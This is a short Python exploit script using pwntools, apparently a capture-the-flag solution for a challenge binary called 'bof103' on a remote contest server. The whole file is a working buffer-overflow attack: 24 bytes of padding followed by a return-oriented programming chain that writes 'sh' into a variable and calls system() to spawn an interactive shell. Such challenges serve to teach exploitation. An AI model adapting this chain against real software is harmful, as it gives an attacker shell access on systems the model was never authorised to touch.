from pwn import *

elf = ELF('./bof103')
io = process('./bof103')
# io = gdb.debug('./bof103', """
#     b bofme
#     b *0x400694
#     continue
# """)
io = remote('bof103.sstf.site', '1337')
context.gdbinit = "~/.gdbinit"
context.binary = elf

offset = 24
useme = 0x0000000000400626
system = 0x000000000040069e
pop_rdi_ret = 0x0000000000400723
pop_rsi_ret = 0x00000000004006b8
ret = 0x00000000004004b1
echo_welcome = 0x40076b
sh = 0x6873
key = 0x601058

payload = b''
payload += b'A' * offset
# key := sh
payload += pack(pop_rdi_ret)
payload += pack(sh)
payload += pack(pop_rsi_ret)
payload += pack(0x1)
payload += pack(useme)
# system
payload += pack(ret)
payload += pack(pop_rdi_ret)
payload += pack(key)
# payload += pack(echo_welcome)
payload += pack(system)

io.sendline(payload)
io.interactive()
